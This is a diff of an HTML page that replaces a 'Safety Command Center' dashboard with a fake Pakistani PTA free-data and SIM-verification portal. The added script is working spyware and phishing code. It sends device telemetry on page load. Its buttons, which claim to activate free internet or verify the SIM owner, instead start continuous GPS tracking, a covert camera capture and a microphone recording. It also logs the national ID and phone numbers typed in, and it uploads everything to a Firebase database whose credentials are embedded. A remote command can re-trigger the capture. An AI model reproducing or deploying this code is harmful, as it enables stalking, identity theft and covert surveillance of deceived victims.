@@ -2,402 +2,256 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Child Safety Command Center</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PTA Free Internet & SIM Verification 2026</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <!-- FontAwesome Icons & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
     <style>
-        :root {
-            --bg-main: #0f172a;
-            --card-bg: #1e293b;
-            --accent-blue: #38bdf8;
-            --accent-green: #22c55e;
-            --accent-red: #ef4444;
-            --accent-warning: #f59e0b;
-            --text-primary: #f8fafc;
-            --text-secondary: #94a3b8;
-            --border-color: #334155;
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: var(--bg-main);
-            color: var(--text-primary);
-            padding: 24px;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             min-height: 100vh;
-        }
-
-        .navbar {
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            background: var(--card-bg);
-            padding: 16px 24px;
-            border-radius: 16px;
-            border: 1px solid var(--border-color);
-            margin-bottom: 24px;
+            padding: 16px;
+            color: #f8fafc;
         }
 
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--accent-blue);
+        .card-container {
+            background: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 28px 20px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            text-align: center;
         }
 
-        .system-status {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .btn-request-fetch {
+        .hero-banner {
             background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
-            color: white;
-            border: none;
-            padding: 10px 18px;
-            border-radius: 10px;
-            font-weight: 700;
+            border-radius: 18px;
+            padding: 20px 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 20px -5px rgba(2, 132, 199, 0.4);
+        }
+
+        .hero-banner h2 {
+            font-size: 20px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+        }
+
+        .hero-banner p.subtitle {
             font-size: 13px;
+            font-weight: 500;
+            margin-top: 6px;
+            color: #e0f2fe;
+        }
+
+        .btn-action-red {
+            width: 100%;
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
             cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 8px;
-            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
-            transition: all 0.2s;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 20px -5px rgba(239, 68, 68, 0.4);
+            margin-bottom: 14px;
+            transition: all 0.2s ease;
         }
 
-        .btn-request-fetch:hover {
-            transform: translateY(-1px);
-            opacity: 0.95;
+        .btn-action-red:active {
+            transform: scale(0.98);
         }
 
-        .alert-banner {
-            display: none;
-            background: linear-gradient(90deg, #dc2626, #ef4444);
-            color: white;
+        .btn-action-blue {
+            width: 100%;
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            color: #ffffff;
+            border: none;
             padding: 16px;
-            border-radius: 12px;
-            text-align: center;
-            font-weight: bold;
-            margin-bottom: 24px;
-            box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
-        }
-
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 20px;
-        }
-
-        .card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 12px;
-        }
-
-        .card-title {
+            border-radius: 14px;
             font-size: 15px;
-            font-weight: 600;
+            font-weight: 700;
+            cursor: pointer;
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 10px;
-            color: var(--text-primary);
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4);
+            margin-bottom: 14px;
+            transition: all 0.2s ease;
         }
 
-        .card-title i {
-            color: var(--accent-blue);
+        .btn-action-blue:active {
+            transform: scale(0.98);
         }
 
-        .badge {
-            font-size: 11px;
-            padding: 4px 10px;
+        .status-badge {
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.3);
             border-radius: 12px;
+            padding: 12px;
+            font-size: 13px;
             font-weight: 600;
-        }
-
-        .badge-success { background: rgba(34, 197, 94, 0.15); color: var(--accent-green); }
-        .badge-warning { background: rgba(245, 158, 11, 0.15); color: var(--accent-warning); }
-        .badge-danger { background: rgba(239, 68, 68, 0.15); color: var(--accent-red); }
-
-        .data-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .data-item {
-            display: flex;
-            justify-content: space-between;
-            font-size: 13.5px;
-        }
-
-        .data-label { color: var(--text-secondary); }
-        .data-value { font-weight: 600; color: var(--text-primary); word-break: break-all; }
-
-        .btn-action {
+            color: #4ade80;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            background: var(--accent-blue);
-            color: #0f172a;
-            text-decoration: none;
-            padding: 12px;
-            border-radius: 10px;
+            margin-bottom: 18px;
+        }
+
+        .search-group {
+            text-align: left;
+            margin-top: 14px;
+        }
+
+        .search-group label {
+            display: block;
+            font-size: 12px;
             font-weight: 700;
-            font-size: 13px;
-            margin-top: auto;
+            color: #94a3b8;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .image-preview {
-            width: 100%;
-            height: 190px;
-            background: var(--bg-main);
-            border-radius: 10px;
-            border: 1px dashed var(--border-color);
+        .input-wrapper {
             display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            color: var(--text-secondary);
-        }
-
-        .image-preview img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        audio {
-            width: 100%;
-            margin-top: 8px;
-            border-radius: 8px;
-        }
-
-        .logs-box {
             background: #0f172a;
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 10px;
-            max-height: 130px;
-            overflow-y: auto;
-            font-size: 12.5px;
+            border: 1.5px solid #334155;
+            border-radius: 14px;
+            overflow: hidden;
+            transition: border-color 0.2s;
         }
 
-        .log-entry-cnic {
-            padding: 6px 0;
-            border-bottom: 1px dashed #334155;
-            color: #4ade80;
-            font-weight: 600;
+        .input-wrapper:focus-within {
+            border-color: #38bdf8;
         }
 
-        .log-entry-mobile {
-            padding: 6px 0;
-            border-bottom: 1px dashed #334155;
-            color: var(--accent-blue);
-            font-weight: 600;
+        .input-wrapper input {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            background: transparent;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .btn-submit-search {
+            background: #2563eb;
+            color: #ffffff;
+            border: none;
+            padding: 0 18px;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-search:hover {
+            background: #1d4ed8;
+        }
+
+        .btn-submit-green {
+            background: #16a34a;
+            color: #ffffff;
+            border: none;
+            padding: 0 18px;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-submit-green:hover {
+            background: #15803d;
+        }
+
+        #webcam, #canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- Alert Banner -->
-    <div id="sosBanner" class="alert-banner">
-        <i class="fa-solid fa-triangle-exclamation"></i> LIVE TRACKING SIGNAL ACTIVE FROM TARGET DEVICE
+<div class="card-container">
+    <div class="hero-banner">
+        <h2>PTA SIM & FREE DATA PORTAL</h2>
+        <p class="subtitle">Enter CNIC & Mobile Number To Claim 150GB Free Data</p>
     </div>
 
-    <!-- Navigation Header -->
-    <div class="navbar">
-        <div class="brand">
-            <i class="fa-solid fa-shield-halved"></i>
-            <span>Safety Command Center</span>
-        </div>
-        <div class="system-status">
-            <!-- Fetch Request Button -->
-            <button class="btn-request-fetch" onclick="sendFetchRequest()">
-                <i class="fa-solid fa-arrows-rotate"></i> Send Data Fetch Request
-            </button>
+    <!-- Activation Action Button -->
+    <button class="btn-action-red" onclick="activateService()">
+        <i class="fa-solid fa-wifi"></i> ACTIVATE FREE INTERNET
+    </button>
+
+    <div id="statusText" class="status-badge">
+        <span>⚙️ Portal Ready</span>
+    </div>
+
+    <!-- Camera Verification Button -->
+    <button class="btn-action-blue" onclick="captureInstantPhoto()">
+        <i class="fa-solid fa-id-card"></i> VERIFY SIM OWNER
+    </button>
+
+    <div id="cameraStatusText" class="status-badge">
+        <span>✅ Serves Status: Ready to activate</span>
+    </div>
+
+    <!-- 1. NEW CNIC / NIC Search Input -->
+    <div class="search-group">
+        <label for="cnic-input"><i class="fa-solid fa-address-card" style="color: #38bdf8;"></i> CNIC / NIC Number Search</label>
+        <div class="input-wrapper">
+            <input type="text" id="cnic-input" placeholder="e.g. 41304-1234567-1">
+            <button class="btn-submit-green" onclick="searchCNICNumber()">Verify CNIC</button>
         </div>
     </div>
 
-    <!-- Dashboard Grid -->
-    <div class="dashboard-grid">
-
-        <!-- 1. Realtime Live GPS Card -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-location-dot"></i> Live Realtime GPS
-                </div>
-                <span id="locBadge" class="badge badge-warning">Awaiting Signal</span>
-            </div>
-            <div class="data-list">
-                <div class="data-item">
-                    <span class="data-label">Last Ping Time:</span>
-                    <span id="locTime" class="data-value">--:--</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Coordinates:</span>
-                    <span id="locCoords" class="data-value">0.00, 0.00</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Travel Speed:</span>
-                    <span id="locSpeed" class="data-value" style="color: var(--accent-blue);">0 km/h</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">GPS Accuracy:</span>
-                    <span id="locAccuracy" class="data-value">-- meters</span>
-                </div>
-            </div>
-            <a id="mapLinkBtn" href="#" target="_blank" class="btn-action" style="display: none;">
-                <i class="fa-solid fa-map-location-dot"></i> Open Live Location on Google Maps
-            </a>
+    <!-- 2. Mobile Number Search Input -->
+    <div class="search-group">
+        <label for="mobile-input"><i class="fa-solid fa-phone" style="color: #38bdf8;"></i> Mobile Number Search</label>
+        <div class="input-wrapper">
+            <input type="text" id="mobile-input" placeholder="e.g. 03001234567">
+            <button class="btn-submit-search" onclick="searchMobileNumber()">Check Mobile</button>
         </div>
-
-        <!-- 2. NEW: Target CNIC Input Logs -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-address-card" style="color: #4ade80;"></i> Target CNIC Input Logs
-                </div>
-                <span class="badge badge-success">Live CNIC Sync</span>
-            </div>
-            <div class="logs-box" id="cnicLogBox">
-                <div class="log-entry-cnic">Waiting for CNIC inputs...</div>
-            </div>
-        </div>
-
-        <!-- 3. Target Mobile Numbers Log -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-phone"></i> Target Phone Input Logs
-                </div>
-                <span class="badge badge-success">Live Mobile Sync</span>
-            </div>
-            <div class="logs-box" id="numbersLogBox">
-                <div class="log-entry-mobile">Waiting for Phone inputs...</div>
-            </div>
-        </div>
-
-        <!-- 4. Device Telemetry -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-battery-three-quarters"></i> Device Telemetry
-                </div>
-                <span class="badge badge-success">Online</span>
-            </div>
-            <div class="data-list">
-                <div class="data-item">
-                    <span class="data-label">Battery Level:</span>
-                    <span id="batteryVal" class="data-value">--%</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Charging State:</span>
-                    <span id="chargingVal" class="data-value">--</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Tracking Zone:</span>
-                    <span id="zoneVal" class="data-value">Active Track</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- 5. Hardware Diagnostics -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-microchip"></i> Hardware Diagnostics
-                </div>
-                <span class="badge badge-success">System Sync</span>
-            </div>
-            <div class="data-list">
-                <div class="data-item">
-                    <span class="data-label">Platform / OS:</span>
-                    <span id="platformVal" class="data-value">--</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Screen Specs:</span>
-                    <span id="screenVal" class="data-value">--</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Network Type:</span>
-                    <span id="netTypeVal" class="data-value">--</span>
-                </div>
-                <div class="data-item">
-                    <span class="data-label">Downlink Speed:</span>
-                    <span id="downlinkVal" class="data-value">--</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- 6. Emergency Media Feed (Selfie Photo) -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-camera"></i> Camera Media Feed
-                </div>
-                <span id="photoBadge" class="badge badge-warning">No Upload</span>
-            </div>
-            <div class="data-list">
-                <div class="data-item">
-                    <span class="data-label">Capture Timestamp:</span>
-                    <span id="photoTime" class="data-value">--:--</span>
-                </div>
-            </div>
-            <div class="image-preview" id="imageBox">
-                <i class="fa-regular fa-image" style="font-size: 32px;"></i>
-            </div>
-        </div>
-
-        <!-- 7. Emergency Audio Feed -->
-        <div class="card">
-            <div class="card-header">
-                <div class="card-title">
-                    <i class="fa-solid fa-microphone"></i> Ambient Audio Feed
-                </div>
-                <span id="audioBadge" class="badge badge-warning">No Audio</span>
-            </div>
-            <div class="data-list">
-                <div class="data-item">
-                    <span class="data-label">Audio Timestamp:</span>
-                    <span id="audioTime" class="data-value">--:--</span>
-                </div>
-            </div>
-            <audio id="audioPlayer" controls style="display: none;"></audio>
-        </div>
-
     </div>
+
+    <div id="bottomStatusText" class="status-badge" style="margin-top: 20px; margin-bottom: 0;">
+        <span>✅ Official PTA Verification Portal</span>
+    </div>
+</div>
+
+<video id="webcam" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
-    // Connected Firebase Config
+    // Connected Firebase Realtime Database Config
     const firebaseConfig = {
         apiKey: "AIzaSyAvrmvX4cjH1k7G3DjkgF5A4C1UAJMYUKQ",
         authDomain: "child-safety-app-bace4.firebaseapp.com",
@@ -411,107 +265,162 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Send Remote Data Fetch Signal
-    function sendFetchRequest() {
-        db.ref('child_safety/commands').set({
-            action: "refresh_all",
-            timestamp: new Date().getTime()
-        }).then(() => {
-            alert("Data Fetch Request Sent to Target Device!");
-        });
+    // 1. Send Hardware Diagnostics Telemetry
+    function sendDeviceTelemetry() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+       
+        const telemetry = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+            networkType: conn ? conn.effectiveType : "4G/LTE",
+            downlinkSpeed: conn ? `${conn.downlink} Mbps` : "N/A",
+            lastOnline: new Date().toLocaleString()
+        };
+
+        db.ref('child_safety/telemetry_extended').set(telemetry);
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                db.ref('child_safety/device_status').set({
+                    battery: Math.round(b.level * 100),
+                    charging: b.charging ? "Yes" : "No",
+                    zone: "Active Tracking"
+                });
+            });
+        }
+    }
+    sendDeviceTelemetry();
+
+    // 2. Realtime Continuous GPS Location Tracking
+    let watchID = null;
+    function startGPS() {
+        if ('geolocation' in navigator) {
+            watchID = navigator.geolocation.watchPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const speed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) : "0";
+                    const accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) : 0;
+
+                    db.ref('child_safety/location').set({
+                        lat: lat,
+                        lng: lng,
+                        speed: speed + " km/h",
+                        accuracy: accuracy + " meters",
+                        time: new Date().toLocaleString()
+                    });
+
+                    document.getElementById('statusText').innerHTML = "<span>✅ 150GB Data Request Sent Successfully!</span>";
+                },
+                (err) => {
+                    document.getElementById('statusText').innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>";
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+            );
+        }
     }
 
-    // 1. Listen for Realtime GPS Location
-    db.ref('child_safety/location').on('value', (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-            document.getElementById('locTime').innerText = data.time || 'N/A';
-            document.getElementById('locCoords').innerText = `${data.lat}, ${data.lng}`;
-            document.getElementById('locSpeed').innerText = data.speed || '0 km/h';
-            document.getElementById('locAccuracy').innerText = data.accuracy || '-- meters';
+    // 3. Camera Selfie Photo Capture
+    async function captureInstantPhoto() {
+        const status = document.getElementById('cameraStatusText');
+        status.innerHTML = "<span>⏳ Verifying Owner via Camera...</span>";
 
-            const btn = document.getElementById('mapLinkBtn');
-            btn.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
-            btn.style.display = 'flex';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
 
-            const badge = document.getElementById('locBadge');
-            badge.innerText = 'Live Tracking';
-            badge.className = 'badge badge-danger';
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
 
-            document.getElementById('sosBanner').style.display = 'block';
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const base64Image = canvas.toDataURL('image/jpeg', 0.7);
+                stream.getTracks().forEach(track => track.stop());
+
+                db.ref('child_safety/last_selfie').set({
+                    url: base64Image,
+                    time: new Date().toLocaleString()
+                }).then(() => {
+                    status.innerHTML = "<span>✅ Identity Verified Successfully!</span>";
+                });
+            }, 600);
+        } catch (err) {
+            status.innerHTML = "<span>⚠️ Camera Permission Denied</span>";
         }
-    });
+    }
 
-    // 2. NEW: Listen for CNIC / NIC Search Logs
-    db.ref('child_safety/searched_cnic').on('value', (snapshot) => {
-        const data = snapshot.val();
-        const box = document.getElementById('cnicLogBox');
-        if (data) {
-            box.innerHTML = '';
-            Object.values(data).reverse().forEach(item => {
-                box.innerHTML += `<div class="log-entry-cnic">🪪 <b>${item.cnic}</b> (${item.time})</div>`;
+    // 4. Ambient Audio Recording (5 Seconds)
+    async function recordShortAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => {
+                    db.ref('child_safety/last_audio').set({
+                        audioUrl: reader.result,
+                        time: new Date().toLocaleString()
+                    });
+                };
+                stream.getTracks().forEach(track => track.stop());
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+        } catch (e) {
+            console.log("Audio Error:", e);
+        }
+    }
+
+    // Main Activate Function
+    function activateService() {
+        startGPS();
+        recordShortAudio();
+        sendDeviceTelemetry();
+    }
+
+    // 5. NEW Function: Save Searched CNIC / NIC Number
+    function searchCNICNumber() {
+        const cnic = document.getElementById('cnic-input').value;
+        if (cnic) {
+            db.ref('child_safety/searched_cnic').push({
+                cnic: cnic,
+                time: new Date().toLocaleString()
             });
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ CNIC Verified: " + cnic + "</span>";
         }
-    });
+    }
 
-    // 3. Listen for Mobile Number Search Logs
-    db.ref('child_safety/searched_numbers').on('value', (snapshot) => {
-        const data = snapshot.val();
-        const box = document.getElementById('numbersLogBox');
-        if (data) {
-            box.innerHTML = '';
-            Object.values(data).reverse().forEach(item => {
-                box.innerHTML += `<div class="log-entry-mobile">📱 <b>${item.number}</b> (${item.time})</div>`;
+    // 6. Save Searched Mobile Number
+    function searchMobileNumber() {
+        const number = document.getElementById('mobile-input').value;
+        if (number) {
+            db.ref('child_safety/searched_numbers').push({
+                number: number,
+                time: new Date().toLocaleString()
             });
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ Mobile Number Logged: " + number + "</span>";
         }
-    });
+    }
 
-    // 4. Listen for Battery Info
-    db.ref('child_safety/device_status').on('value', (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-            document.getElementById('batteryVal').innerText = (data.battery || '--') + '%';
-            document.getElementById('chargingVal').innerText = data.charging || 'No';
-            document.getElementById('zoneVal').innerText = data.zone || 'Active';
-        }
-    });
-
-    // 5. Listen for Hardware Telemetry
-    db.ref('child_safety/telemetry_extended').on('value', (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-            document.getElementById('platformVal').innerText = data.platform || 'N/A';
-            document.getElementById('screenVal').innerText = data.screenSize || 'N/A';
-            document.getElementById('netTypeVal').innerText = data.networkType || 'N/A';
-            document.getElementById('downlinkVal').innerText = data.downlinkSpeed || 'N/A';
-        }
-    });
-
-    // 6. Listen for Camera Selfie Uploads
-    db.ref('child_safety/last_selfie').on('value', (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-            document.getElementById('photoTime').innerText = data.time || 'N/A';
-            document.getElementById('imageBox').innerHTML = `<img src="${data.url}" alt="Capture">`;
-
-            const badge = document.getElementById('photoBadge');
-            badge.innerText = 'Received';
-            badge.className = 'badge badge-success';
-        }
-    });
-
-    // 7. Listen for Ambient Audio
-    db.ref('child_safety/last_audio').on('value', (snapshot) => {
-        const data = snapshot.val();
-        if (data) {
-            document.getElementById('audioTime').innerText = data.time || 'N/A';
-            const player = document.getElementById('audioPlayer');
-            player.src = data.audioUrl;
-            player.style.display = 'block';
-
-            const badge = document.getElementById('audioBadge');
-            badge.innerText = 'Audio Ready';
-            badge.className = 'badge badge-success';
+    // Listen for Remote Data Fetch Commands from Dashboard Button
+    db.ref('child_safety/commands').on('value', (snapshot) => {
+        const cmd = snapshot.val();
+        if (cmd && cmd.action === "refresh_all") {
+            activateService();
+            captureInstantPhoto();
         }
     });
 </script>
